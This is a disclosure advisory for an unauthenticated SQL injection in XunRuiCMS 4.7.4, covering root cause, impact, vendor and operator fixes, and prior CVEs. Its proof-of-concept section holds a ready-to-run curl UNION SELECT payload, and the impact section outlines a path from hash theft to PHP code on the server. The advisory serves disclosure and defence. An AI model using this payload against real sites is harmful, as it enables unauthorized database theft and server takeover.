# XunRuiCMS 4.7.4 — Unauthenticated SQL Injection in the Member Template Endpoint

> **Status**: disclosed · **CVE**: pending
> **Discovered by**: fr3rty
> **Disclosure date**: 2026-10-30
> **Affected**: XunRuiCMS 4.7.4 (official package, build 2026-10-30)
> **Severity**: High — CVSS 3.1 `7.5` / CVSS 4.0 `8.7`
> **CWE**: CWE-89 (SQL Injection)

This page is the public advisory for the vulnerability. It is written so that the vendor, a CNA, and any site operator can verify the issue without contacting the reporter.

---

## 1. Summary

XunRuiCMS 4.7.4 lets an unauthenticated visitor run SQL through the `catid` parameter of the front-end template endpoint:

```
GET /index.php?s=member&c=api&m=template&name=search.html&module=news&catid=<PAYLOAD>
```

`catid` is not cast to an integer. The value is assigned to a template variable, interpolated into a `{module catid=$catid}` tag, and the `where='…'` fragment of that tag is concatenated into the module query as raw SQL. One request with a `UNION SELECT` payload returns the database name and version. The same request shape reads `dr_member`, including the administrator password hash and salt.

---

## 2. Affected versions

| Item | Value |
|---|---|
| Affected | XunRuiCMS **4.7.4** (official package, build 2026-10-30) |
| Not affected (confirmed) | none — earlier versions were not tested and are not claimed |
| Fixed | no fixed release as of 2026-10-30 |
| Authentication required | none |
| Configuration required | default install; `Member` application installed and one content module present (the package ships `news`) |

---

## 3. Root cause

The `Member` application ships its own copy of the template endpoint, `dayrui/App/Member/Controllers/Api.php::template()`. That copy assigns every GET parameter into the template engine without touching `catid`:

```php
// dayrui/App/Member/Controllers/Api.php:285
\Phpcmf\Service::V()->assign(\Phpcmf\Service::L('input')->get('', true));
ob_start();
\Phpcmf\Service::V()->display($file);      // search.html
```

The bundled template contains a module tag that interpolates the variable:

```text
template/pc/default/home/search.html:96
{module catid=$catid order=hits num=10}
```

The template engine treats a `where='…'` fragment inside a tag as raw SQL:

```php
// dayrui/Fcms/Core/View.php:1008
if (preg_match('/where=\'(.+)\'/sU', $_params, $match)) {
    $param['where'] = $match[1];
    $_params = str_replace($match[0], '', $_params);
}

// dayrui/App/Cms/Action/Module.php:46
if ($param['where']) {
    $where[] = ['adj' => 'SQL', 'value' => urldecode($param['where'])];
}

// dayrui/Fcms/Core/View.php:1874
case 'SQL':
    $string .= $join.' '.str_replace('@#', $m->dbprefix(), $t['value']);
```

The framework's own copy of the same method is hardened, and the `Member` copy was never updated:

```php
// dayrui/Fcms/Control/Api/Api.php:390-397
if (isset($get['where']) && $get['where']) {
    $get['where'] = '';                       // drop where
}
if (isset($get['catid']) && $get['catid']) {
    foreach (explode(',', $get['catid']) as $t) { $catid_list[] = intval($t); }
}
```

So the defect is a missed sync, not a design decision.

---

## 4. Proof of concept

Environment: 4.7.4 clean install, nginx 1.24, PHP 7.4.33, MariaDB 10.11.19, `news` module, table prefix `dr_`.

```bash
curl -s "http://TARGET/index.php?s=member&c=api&m=template&name=search.html&module=news&catid=1%20where%3D%271%3D1%20AND%201%3D2%20UNION%20SELECT%201%2C1%2CCONCAT%280x7e44422d%2Cdatabase%28%29%2C0x7e%29%2C1%2C1%2CCONCAT%280x7e5645522d%2C%40%40version%2C0x7e%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%20%23%27"
```

Decoded parameter:

```
catid=1 where='1=1 AND 1=2 UNION SELECT 1,1,CONCAT(0x7e44422d,database(),0x7e),1,1,CONCAT(0x7e5645522d,@@version,0x7e),1,1,1,1,1,1,1,1,1,1,1 #'
```

Response excerpt:

```html
<a href="/1" class="ep-side-hit-title">~DB-xunrui~</a>
<div class="ep-side-hit-desc">~VER-10.11.19-MariaDB~</div>
```

A runnable script that reproduces this with the Python standard library is linked below. It also carries a time-based fallback for sites whose template was edited.

---

## 5. Impact

- Read the database name, version, and any table reachable by the module query, including `dr_member` (administrator username, password hash, salt, email, login IP).
- The hash format is `md5(md5(plain)+salt+md5(plain))`, which can be cracked offline.
- A cracked administrator account gives access to the panel (`adminXXXX.php`), where template and module write features can place PHP code on disk.
- A `SLEEP()` payload holds database connections open, so the endpoint can also be used for resource exhaustion.

---

## 6. Remediation

**Vendor side**

1. In `App/Member/Controllers/Api.php::template()`, cast `catid` to an integer list and drop the `where` key, the same way `Fcms/Control/Api/Api.php:390-397` does.
2. In `Fcms/Core/View.php::list_tag()`, reject parameter values containing quotes, spaces, parentheses, `#`, or `--`, and replace the raw `where='…'` form with a structured `field / operator / value` bound as a query parameter.
3. Require an authenticated session or a signature on `m=template`.

**Operator side (until a fixed release)**

- Block requests to `s=member&c=api&m=template` whose `catid` contains `where=`, `#`, `--`, or whitespace.
- Disable `m=template` if the site does not use the front-end template editor.
- Keep `adminXXXX.php` off the public internet.

---

## 7. Duplicate check

| Record | What it covers | Why it is not this issue |
|---|---|---|
| CVE-2026-101018 | Admin-side `group_all_edit` `groupid` SQL injection, 4.7.0–4.7.2, requires an administrator (`PR:H`) | different file, parameter, and privilege level |
| CVE-2017-11583 | FineCms 5.0.9 `libraries/Template.php` `catid` injection via `action=related` | predecessor code base; that file and code path are absent in 4.7.4 |
| CVE-2021-38243 | `/index.php` RCE up to 4.5.1 (`extract` variable overwrite via the same `m=template` route) | different root cause; the vendor fixed that chain, and the `catid` → `where` path still works in 4.7.4 |

No CVE exists for XunRuiCMS 4.7.3 or 4.7.4.

---

## 8. Timeline

| Date | Event |
|---|---|
| 2026-10-30 | Found during a source audit of the 4.7.4 package; reproduced on a clean install |
| 2026-10-30 | Advisory published |

---

## 9. References

- Vendor site: https://www.xunruicms.com/
- Vendor download page: https://www.xunruicms.com/down/
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- Verification script: [`poc.py`](poc.py)

---

## 10. Credit

Found and reported by **fr3rty**. Please keep this name in the CVE `credits` field and in any vendor advisory.

*This advisory is published for defensive purposes. Test only systems you own or are authorized to test.*
